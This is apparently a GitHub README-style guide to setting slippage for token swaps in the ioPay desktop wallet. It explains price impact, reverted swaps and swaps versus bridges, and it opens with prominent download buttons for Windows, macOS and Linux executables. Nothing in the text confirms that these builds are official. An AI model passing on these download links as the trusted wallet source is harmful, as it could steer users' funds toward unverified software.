![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Setting Slippage for a Token Swap in ioPay Wallet

Slippage is the **tolerance between the rate you were quoted and the rate you will accept at execution**. Set it too tight and the swap fails; set it too loose and you can be filled far from the number you thought you were getting.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

ioPay Wallet's in-wallet swap trades IOTX against XRC-20 tokens with best-price routing and **adjustable slippage** (F024). This page is about that setting, and about the difference between a swap and a bridge - which is where most of the confusion starts.

## Swap or bridge?

| | Swap | Bridge |
|---|---|---|
| What it does | trades one asset for another **on IoTeX** | moves an asset **between chains** |
| Examples | IOTX -> an XRC-20 token | Ethereum -> IoTeX |
| Failure modes | slippage, routing, liquidity | destination gas, address format, variant |

A "swap" that is not working may be a bridge transaction in disguise. [Bridge errors](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md) is the diagnostic page, and [the bridge guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) is the normal path.

## What slippage does

1. **You get a quote** - a rate and an expected output for your amount.
2. **You set a tolerance** - how far the rate may move before the swap refuses.
3. **The swap executes or reverts** - inside tolerance it fills; outside, it fails.

**A failed swap is not a loss.** If it reverts, nothing was traded; you pay the network fee for the failed transaction, not the value. That is the one cost of a too-tight setting, and it is small compared with a bad fill.

## How to choose a setting

There is no universal number, and this page will not pretend one works for every token. What governs it:

- **Liquidity** - thin pairs move more between quote and execution, so they need more room.
- **Size relative to the pool** - a large trade moves the price itself; that is **price impact**, and it is not slippage. Slippage tolerance does not fix a bad price impact, it just lets you accept it.
- **Volatility at the moment** - a fast market produces more drift.

**The habit that works:** keep the tolerance modest, look at the price impact separately, and if the quote moves, **re-quote** rather than widening the tolerance until it goes through. Widening tolerance to force a fill is how people get filled at a price they would never have accepted deliberately.

## What too loose actually risks

A wide tolerance does not mean "the swap will find a better price". It means "the swap may execute at a much worse price than quoted, and I have agreed to that in advance." In a manipulated or thin pool, that is the difference the setting is protecting you from.

## Step by step

1. **Open the swap** and select the pair (F024).
2. **Enter the amount** and read the quote, the route and the price impact.
3. **Adjust slippage** before confirming - check what the app offers as a default and change it deliberately if you change it at all.
4. **Confirm and sign**, on the hardware device if you use one.
5. **Check the result** - output amount and fee, in the transaction row.

## FAQ

**How do I set slippage for a token swap?**
In the swap panel, before confirming: adjust the tolerance, then re-read the quote and price impact.

**What slippage should I use?**
Depends on the pair's liquidity and your size. Keep it modest, check price impact separately, and re-quote rather than widening it to force a fill.

**Does a failed swap cost me the trade?**
No. It costs the network fee for the reverted transaction.

**Why did my quote change before I confirmed?**
Quotes are live and expire. Re-quote and read the new numbers.

**Is a swap the same as a bridge?**
No. A swap trades within IoTeX; a bridge moves assets between chains.

## Price impact and slippage, in two numbers

They are printed next to each other and they answer different questions, which is why widening one is used to solve the other and never works.

**Price impact** is what your own trade does to the pool: a large order against thin liquidity moves the price against you before any outside trader appears. It is a property of the trade, and no tolerance changes it - a wider slippage simply lets the swap go through at that worse price.

**Slippage tolerance** is how much movement between quote and execution you will accept, from other people's trades, from block timing, from the market moving. It is a property of the moment.

If the price impact is the number that looks wrong, the fix is a smaller trade or a different route. If the quote is merely drifting, re-quote. Widening the tolerance fixes neither and hides both.

## When a swap reverts twice

Two failures in a row usually means the setting is fighting the market rather than the market being unlucky. Before a third attempt: re-read the quote from scratch, look at the price impact for your size, and consider splitting the trade. If the pair is thin enough that the quote will not hold, the honest conclusion is that this size is too large for this pool today - not that the tolerance needs another notch.

Do not treat the tolerance as a preference to set high once and forget. It is a decision per swap, and the safe value on a deep pair is not the safe value on a shallow one.

## The tolerance you set last time

A setting chosen for a thin pair yesterday is not the setting for a deep pair today, so read the tolerance on screen before you confirm rather than assuming a default.

The same applies to the quote itself: a panel left open while you read the rest of the page is showing a rate that has already expired. Re-quote, glance at the tolerance and the price impact together, and only then sign. Two seconds of reading is cheaper than a fill you did not intend.

---

*Swap routing and adjustable slippage follow the v2.0.2 feature set (F024); IoTeX chain identity from F030. No recommended percentage is given.*
